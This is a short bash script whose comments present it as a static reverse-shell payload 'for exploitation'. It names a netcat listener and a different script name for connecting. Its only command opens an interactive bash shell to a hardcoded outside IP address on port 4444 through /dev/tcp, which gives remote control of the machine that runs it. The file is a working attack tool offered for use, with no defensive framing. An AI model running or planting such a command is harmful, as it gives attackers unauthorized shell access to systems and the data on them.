#!/bin/bash
# Author: yulibao
# Date: 2020-7-1
# Script: A static version of revers.sh, for some specital treatement in exploitation

# Usage:
# remote listening may be like this: 
#   nc -lvvp 4444

# and connect to ir by:
# ./forPoayload.sh

# change the hardcoded address before using
bash -i >& /dev/tcp/34.92.246.183/4444 0>&1
